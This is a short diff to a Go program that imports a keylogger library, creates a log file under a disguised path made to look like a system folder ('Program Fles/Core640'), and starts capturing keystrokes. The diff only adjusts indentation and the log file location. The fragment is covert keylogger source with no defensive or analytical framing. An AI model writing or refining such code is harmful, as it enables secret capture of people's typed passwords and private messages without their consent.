@@ -1,4 +1,4 @@
-		package main
+package main
 
 import(
 	keys"github.com/kindlyfire/go-keylogger"
@@ -35,7 +35,7 @@ func exist(name string) bool {
 
 func main() {
 	if !exist("C:/Program Fles/Core640/corelg.txt") {
-		_, err := os.Create("corelg.txt")
+		_, err := os.Create("C:/Program Fles/Core640/corelg.txt")
 		check(err)
 	}
 	kl := keys.NewKeylogger()	
